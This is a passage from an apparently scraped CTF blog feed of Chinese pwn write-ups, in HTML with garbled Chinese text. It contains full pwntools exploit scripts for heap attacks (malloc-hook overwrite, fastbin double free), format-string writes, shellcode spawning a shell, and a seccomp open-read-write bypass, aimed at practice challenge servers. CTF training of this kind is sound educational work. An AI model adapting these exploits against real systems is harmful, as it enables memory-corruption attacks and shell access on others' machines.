class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Import pwntools</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># First establish the target process and libc file</span><br>target = process(<span class="hljs-string">&#x27;./0ctfbabyheap&#x27;</span>, env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>&#125;) <span class="hljs-comment"># The ld_preload is used to switch out the libc version we are using</span><br><span class="hljs-comment">#gdb.attach(target)</span><br>elf = ELF(<span class="hljs-string">&#x27;libc-2.23.so&#x27;</span>)<br><br><span class="hljs-comment"># Establish the functions to interact with the program</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>target.recvuntil(<span class="hljs-string">b&quot;Command: &quot;</span>)<br>target.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>target.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)<br>target.sendline(<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">index, size, content</span>):<br>target.recvuntil(<span class="hljs-string">b&quot;Command: &quot;</span>)<br>target.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>target.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>target.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>target.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)<br>target.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>target.recvuntil(<span class="hljs-string">b&quot;Content: &quot;</span>)<br>target.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>target.recvuntil(<span class="hljs-string">b&quot;Command: &quot;</span>)<br>target.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>target.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>target.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index</span>):<br>target.recvuntil(<span class="hljs-string">b&quot;Command&quot;</span>)<br>target.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>target.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>target.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>target.recvuntil(<span class="hljs-string">b&quot;Content: \n&quot;</span>)<br>content = target.recvline()<br><span class="hljs-keyword">return</span> content<br><br><span class="hljs-comment"># Make the initial four allocations, and fill them with data</span><br>alloc(<span class="hljs-number">0xf0</span>)<span class="hljs-comment"># Chunk 0</span><br>alloc(<span class="hljs-number">0x70</span>)<span class="hljs-comment"># Chunk 1</span><br>alloc(<span class="hljs-number">0xf0</span>)<span class="hljs-comment"># Chunk 2</span><br>alloc(<span class="hljs-number">0x30</span>)<span class="hljs-comment"># Chunk 3</span><br>fill(<span class="hljs-number">0</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-number">0xf0</span>)<br>fill(<span class="hljs-number">1</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&quot;1&quot;</span>*<span class="hljs-number">0x70</span>)<br>fill(<span class="hljs-number">2</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-string">&quot;2&quot;</span>*<span class="hljs-number">0xf0</span>)<br>fill(<span class="hljs-number">3</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">&quot;3&quot;</span>*<span class="hljs-number">0x30</span>)<br><br><span class="hljs-comment"># Free the first two</span><br>free(<span class="hljs-number">0</span>)<span class="hljs-comment"># Chunk 0</span><br>free(<span class="hljs-number">1</span>)<span class="hljs-comment"># Chunk 1</span><br><br><span class="hljs-comment"># Allocate new space where chunk 1 used to be, and overflow chunk chunk 2&#x27;s previous size with 0x180 and the previous in use bit with 0x0 by pushing 0x100</span><br>alloc(<span class="hljs-number">0x78</span>)<span class="hljs-comment"># Chunk 0</span><br>fill(<span class="hljs-number">0</span>, <span class="hljs-number">128</span>, <span class="hljs-string">b&#x27;4&#x27;</span>*<span class="hljs-number">0x70</span> + p64(<span class="hljs-number">0x180</span>) + p64(<span class="hljs-number">0x100</span>))<br><br><span class="hljs-comment"># Free the second chunk, which will bring the edge of the heap before the new chunk 0, thus effictively forgetting about Chunk 0</span><br>free(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Allocate a new chunk that will move the libc address for main_arena+88 into the content </span><br>alloc(<span class="hljs-number">0xf0</span>)<span class="hljs-comment"># Chunk 1</span><br>fill(<span class="hljs-number">1</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-string">&#x27;5&#x27;</span>*<span class="hljs-number">0xf0</span>)<br><br><span class="hljs-comment"># Print the contents of chunk 0, and filter out the main_arena+88 infoleak, and calculate the offsets for everything else</span><br>leak = u64(dump(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>])<br>libc = leak - elf.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x68</span><br>system = libc + <span class="hljs-number">0x4526a</span><br>malloc_hook = libc + elf.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook = libc + elf.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>fake_chunk = malloc_hook - <span class="hljs-number">0x23</span><br>log.info(<span class="hljs-string">&quot;Leak is:        &quot;</span> + <span class="hljs-built_in">hex</span>(leak))<br>log.info(<span class="hljs-string">&quot;System is:      &quot;</span> + <span class="hljs-built_in">hex</span>(system))<br>log.info(<span class="hljs-string">&quot;Free hook is:   &quot;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>log.info(<span class="hljs-string">&quot;Malloc hook is: &quot;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>log.info(<span class="hljs-string">&quot;Fake chunk is:  &quot;</span> + <span class="hljs-built_in">hex</span>(fake_chunk))<br>log.info(<span class="hljs-string">&quot;libc is:        &quot;</span> + <span class="hljs-built_in">hex</span>(libc))<br><br><span class="hljs-comment"># Free the first chunk to make room for the double free/fastbin duplicaion</span><br>free(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Allocate the next four chunks, chunk 5 will directly overlap with chunk 0 and both chunks will have the same pointer</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment"># Chunk 1</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 2</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 4</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 5</span><br><br><span class="hljs-comment"># Commence the double free by freeing 5 then 0, and 4 in between to stop a crash</span><br>free(<span class="hljs-number">5</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># Allocate 2 chunks, fill in the chunk that was freed twice with the fake chunk, allocate that chunk again to add the fake chunk to the free list</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 4</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 5</span><br>fill(<span class="hljs-number">0</span>, <span class="hljs-number">0x60</span>, p64(fake_chunk) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">b&#x27;y&#x27;</span>*<span class="hljs-number">0x50</span>)<br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 0</span><br><br><span class="hljs-comment"># Allocate the fake chunk, and write over the malloc hook with the One Shot Gadget</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 6</span><br>fill(<span class="hljs-number">6</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-string">b&#x27;z&#x27;</span>*<span class="hljs-number">0x13</span> + p64(system))<br><br><span class="hljs-comment"># Trigger a Malloc call to trigger the malloc hook, and pop a shell</span><br>target.sendline(<span class="hljs-string">b&#x27;1\n1\n&#x27;</span>)<br>target.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)<br><br><span class="hljs-comment"># Drop to an interactive shell to use the shell</span><br>target.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastbin Attack</title>
    <link href="/2023/10/24/ctf-pwn/Fastbin%20Attack/"/>
    <url>/2023/10/24/ctf-pwn/Fastbin%20Attack/</url>
    
    <content type="html"><![CDATA[<h4 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h4><h5 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h5><p>ä»¥buuoj NewStarCTF 2023 week 4 Doubleä¸ºä¾‹</p><p>ç›®çš„æ˜¯å‘ä»»æ„åœ°å€å†™å…¥å€¼</p><p>ç»å…¸çš„ç½‘å›¾</p><p><img src="/img/Fastbin/1.jpg"></p><p>åŸç†åœ¨äºï¼Œä¸‰æ¬¡freeä¹‹åï¼Œç¬¬ä¸€æ¬¡æŠŠchunk1 mallocå‡ºæ¥ä¹‹åï¼Œå¯ä»¥å¯¹contentéƒ¨åˆ†è¿›è¡Œç¼–è¾‘ï¼Œè€Œcontentå¯¹äºç¬¬ä¸‰æ¬¡mallocå‡ºæ¥çš„chunk1æ˜¯fdï¼Œè¿™ä¸ªfdåœ¨ç¬¬å››æ¬¡mallocæ—¶ï¼Œä¼šä»è‡ªå·±å†™çš„åœ°å€è¿›è¡Œmallocï¼Œç„¶åè¿™ä¸ªmallocå‡ºæ¥çš„å—çš„contentåˆæ˜¯å¯ç¼–è¾‘çš„ã€‚è¿™æ ·å°±å®ç°äº†ä»»æ„åœ°å€å†™ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./Double&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">25942</span>)<br><br><span class="hljs-comment">#gdb.attach(p, &quot;b *0x080486B5&quot;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, content</span>):<br>  p.recvuntil(<span class="hljs-string">b&quot;&gt;\n&quot;</span>)<br>  p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>  p.recvuntil(<span class="hljs-string">b&quot;Input idx\n&quot;</span>)<br>  p.sendline(idx)<br>  p.recvuntil(<span class="hljs-string">b&quot;Input content\n&quot;</span>)<br>  p.sendline(content)<br>  <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>  p.recvuntil(<span class="hljs-string">b&quot;&gt;\n&quot;</span>)<br>  p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>  p.recvuntil(<span class="hljs-string">b&quot;Input idx\n&quot;</span>)<br>  p.sendline(idx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():  <br>  p.recvuntil(<span class="hljs-string">b&quot;&gt;\n&quot;</span>)<br>  p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>  <br>  <br>add(<span class="hljs-string">b&#x27;1&#x27;</span>, <span class="hljs-string">b&quot;aaaa&quot;</span>)<br>add(<span class="hljs-string">b&#x27;2&#x27;</span>, <span class="hljs-string">b&quot;bbbb&quot;</span>)<br>free(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>free(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>free(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>add(<span class="hljs-string">b&#x27;1&#x27;</span>, p64(<span class="hljs-number">0x602070</span> - <span class="hljs-number">16</span>))<br><br>add(<span class="hljs-string">b&#x27;2&#x27;</span>, <span class="hljs-string">b&#x27;dddd&#x27;</span>)<br><br>add(<span class="hljs-string">b&#x27;3&#x27;</span>, <span class="hljs-string">b&#x27;eeee&#x27;</span>)<br><br>add(<span class="hljs-string">b&#x27;4&#x27;</span>, p64(<span class="hljs-number">1638</span>))<br><br>check()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h5 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h5><h5 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h5><h5 id="Arbitary-Alloc"><a href="#Arbitary-Alloc" class="headerlink" title="Arbitary Alloc"></a>Arbitary Alloc</h5>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FormatString</title>
    <link href="/2023/10/23/ctf-pwn/FormatString/"/>
    <url>/2023/10/23/ctf-pwn/FormatString/</url>
    
    <content type="html"><![CDATA[<h4 id="xctf-string"><a href="#xctf-string" class="headerlink" title="xctf string"></a>xctf string</h4><p><img src="/img/FormatString/1.png"></p><p>ç®€å•çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²</p><p>è¿™é“é¢˜ç›®éœ€è¦æ³¨æ„çš„ç‚¹åŒ…æ‹¬</p><ol><li><p>é¢˜ç›®ä¸­ç”¨%xæ‰“å°å‡ºæ¥çš„åœ°å€ï¼Œå¯ä»¥ç›´æ¥ç”¨<code>int(...,16)</code>æ¥æ¥æ”¶ï¼Œä¸è¦ç”¨ljusté‚£ä¸€å¥—ã€‚ã€‚ã€‚ï¼ˆ-_-||</p></li><li><p>åœ¨åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„æ—¶å€™ï¼Œå¦‚æœç”¨<code>p64(addr)  + %n(æˆ–è€…%p)...</code>æ—¶ï¼Œè¦å…ˆä¿è¯addræ²¡æœ‰<code>\0</code></p><p>å°±åƒè¿™é“é¢˜ï¼Œæˆ‘ä¸€å¼€å§‹å°±éå¾—ä¸ç”¨å®ƒé‚£ä¸ª%ldè¾“å…¥è¦å†™å…¥çš„åœ°å€ï¼Œå°±éè¦æŠŠx[0]çš„åœ°å€å’Œåé¢é‚£ä¸€ä¸²ä¸€èµ·å†™è¿›å»ï¼Œåæœå°±æ˜¯print(format)æ—¶å€™æ ¹æœ¬ä¸ä¼šæ‰“å°aaaaâ€¦..å’Œ%nï¼Œå› ä¸ºåœ°å€é‡Œæœ‰\0ï¼Œç›´æ¥åœæ­¢äº†ğŸ˜­è¿˜åœ¨é‚£çœ‹äº†å¥½åŠå¤©æ˜¯ä¸æ˜¯åœ°å€çš„æ ¼å¼é—®é¢˜</p></li><li><p><code>shellcraft.sh</code>ç”¨ä¹‹å‰**ä¸€å®šè¦å…ˆæŒ‡å®šå¹³å° **<code> context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)</code></p></li></ol><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./1d3c852354df4609bf8e56fe8e9df316&quot;)</span><br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>, <span class="hljs-number">58702</span>)<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>e = ELF(<span class="hljs-string">&quot;./1d3c852354df4609bf8e56fe8e9df316&quot;</span>)<br><br><span class="hljs-comment">#gdb.attach(p, &quot;b *0x400d36&quot;)</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;secret[0] is &quot;</span>)<br>x0 = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(x0))<br><br>p.recvuntil(<span class="hljs-string">b&quot;What should your character&#x27;s name be:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;123&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;So, where you will go?east or up?:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;east&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;go into there(1), or leave(0)?:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;\&#x27;Give me an address\&#x27;\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(x0))<br><br>p.recvuntil(<span class="hljs-string">b&quot;And, you wish is:\n&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">85</span> + <span class="hljs-string">b&quot;%7$n&quot;</span><br><span class="hljs-comment">#payload = b&#x27;aaaaaaaa&#x27; + b&quot;%p%p%p%p-%p%p%p%p-%p%p%p%p-%p%p%p%p&quot;</span><br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">b&quot;That&#x27;s sound terrible! you meet final boss!but you level is ONE!\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Wizard: I will help you! USE YOU SPELL\n&quot;</span>)<br><br><span class="hljs-comment">#shellcode = &#x27;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&#x27;</span><br><br>shellcode = asm(shellcraft.sh())<br><br><br>p.sendline(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="gyctf-2020-some-thing-interesting"><a href="#gyctf-2020-some-thing-interesting" class="headerlink" title="gyctf_2020_some_thing_interesting"></a>gyctf_2020_some_thing_interesting</h4><p><a href="https://buuoj.cn/challenges#gyctf_2020_some_thing_interesting">https://buuoj.cn/challenges#gyctf_2020_some_thing_interesting</a></p><p>æœ¬åœ°è¿è¡Œä¸èµ·æ¥ï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› ã€‚</p><p>ç›´æ¥åœ¨æ ˆä¸Šæ³„éœ²è¿”å›<code>__libc_start_main</code>çš„åç§»åœ°å€ï¼Œç®—å‡ºlibc</p><p>å‚è€ƒ <a href="https://blog.csdn.net/mcmuyanga/article/details/114643601">https://blog.csdn.net/mcmuyanga/article/details/114643601</a></p><p><img src="/img/FormatString/2.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">r.recvuntil(<span class="hljs-string">&quot;&gt; Input your code please:&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;OreOOrereOOreO%17$p&quot;</span>)<span class="hljs-comment">#elf 11 libc 17</span><br><br>r.recvuntil(<span class="hljs-string">&quot;#######################\n&quot;</span>)<br>r.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;# Your Code is &quot;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br><br>start_main = <span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0xf0</span><br>libc.address = start_main - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>fmt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>orw</title>
    <link href="/2023/10/18/ctf-pwn/orw/"/>
    <url>/2023/10/18/ctf-pwn/orw/</url>
    
    <content type="html"><![CDATA[<h5 id="å®‰è£…seccomp"><a href="#å®‰è£…seccomp" class="headerlink" title="å®‰è£…seccomp"></a>å®‰è£…seccomp</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install gcc ruby-dev<br>gem install seccomp-tools<br></code></pre></td></tr></table></figure><p><a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Not%20Bad">https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Not%20Bad</a></p><p><img src="/img/orw/1.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = process(&quot;./bad&quot;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28003</span>)<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>mmap=<span class="hljs-number">0x123000</span><br>jmp_rsp = <span class="hljs-number">0x400A01</span><br>orw_payload = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>)<br>orw_payload += shellcraft.read(<span class="hljs-number">3</span>, mmap, <span class="hljs-number">0x50</span>)<br>orw_payload += shellcraft.write(<span class="hljs-number">1</span>, mmap,<span class="hljs-number">0x50</span>)<br><br>payload=asm(shellcraft.read(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0x100</span>))+asm(<span class="hljs-string">&#x27;mov rax,0x123000;call rax&#x27;</span>)<br>payload=payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(jmp_rsp)+asm(<span class="hljs-string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)<br><span class="hljs-comment"># retçš„æ—¶å€™ï¼Œç›¸å½“äºpop ripï¼Œrspå°±ä¼šæŒ‡å‘è¿”å›åœ°å€ä¸‹ä¸€ä¸ªæ ˆå‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œjmp rspä¹‹åï¼Œå°±ä¼šæ‰§è¡Œsub rsp,0x30</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;Easy shellcode, have fun!&#x27;</span>)<br>p.sendline(payload)<br><br>shellcode=asm(orw_payload)<br>p.sendline(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stack Migration</title>
    <link href="/2023/10/11/ctf-pwn/stack_migration/"/>
    <url>/2023/10/11/ctf-pwn/stack_migration/</url>
    
    <content type="html"><![CDATA[<h3 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h3><h4 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h4><p><a href="https://buuoj.cn/challenges#ciscn_2019_es_2">https://buuoj.cn/challenges#ciscn_2019_es_2</a></p><p><img src="/img/stack_migration/1.jpg"></p><p>æº¢å‡ºçš„é•¿åº¦ä¸è¶³ä»¥å†™ropé“¾ï¼ŒåŠ«æŒrbpåˆ°ä¸€ä¸ªè¶³å¤Ÿå¤§çš„ç©ºé—´é‡Œå»</p><p>é¦–å…ˆé€šè¿‡è°ƒè¯•æŸ¥çœ‹ebpåˆ°å¯è¾“å…¥ç©ºé—´å¼€å¤´çš„è·ç¦»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">gdb.attach(p, <span class="hljs-string">&quot;b *0x080485FC&quot;</span>) <span class="hljs-comment"># åœ¨python pwntoolsé‡Œä¸‹æ–­ç‚¹çš„æ–¹æ³•ï¼ˆè¦æ”¾åœ¨å¼€å¤´ï¼‰ï¼Œè¿›å»æŒ‰ä¸€ä¸‹c</span><br></code></pre></td></tr></table></figure><p><img src="/img/stack_migration/2.jpg"></p><p>ç¨‹åºè¾“å‡ºçš„rbpä¸º<code>0xffdb7098</code>ï¼Œå’Œå›¾ä¸­aaaaçš„ä½ç½®ç›¸å·®0x38ï¼Œä¸€ä¼šå°±è¦å°†ebpè¦†ç›–ä¸ºebp-0x38ï¼Œä»è€Œå¼€è¾Ÿè¶³å¤Ÿçš„ç©ºé—´æ¥æ„é€ rop</p><p>ç„¶å<code>vul()</code>å‡½æ•°åŸæœ¬çš„è¿”å›åœ°å€è¢«<code>&amp;(leave ret)</code>å–ä»£äº†è¿™æ ·åœ¨<code>vul()</code>æ‰§è¡Œç»“æŸæ—¶ï¼Œç›¸å½“äºå¤šæ‰§è¡Œä¸€æ¬¡leave ret</p><p>è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">1</span>. vul()åŸæœ¬çš„<span class="hljs-keyword">leave</span><br><span class="hljs-built_in">esp</span>-&gt;<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x38</span>   <span class="hljs-built_in">ebp</span>-&gt;aaaa   <span class="hljs-built_in">esp</span>-&gt;<span class="hljs-keyword">leave</span> <span class="hljs-keyword">ret</span><br><span class="hljs-number">2</span>. vul()åŸæœ¬çš„<span class="hljs-keyword">ret</span><br><span 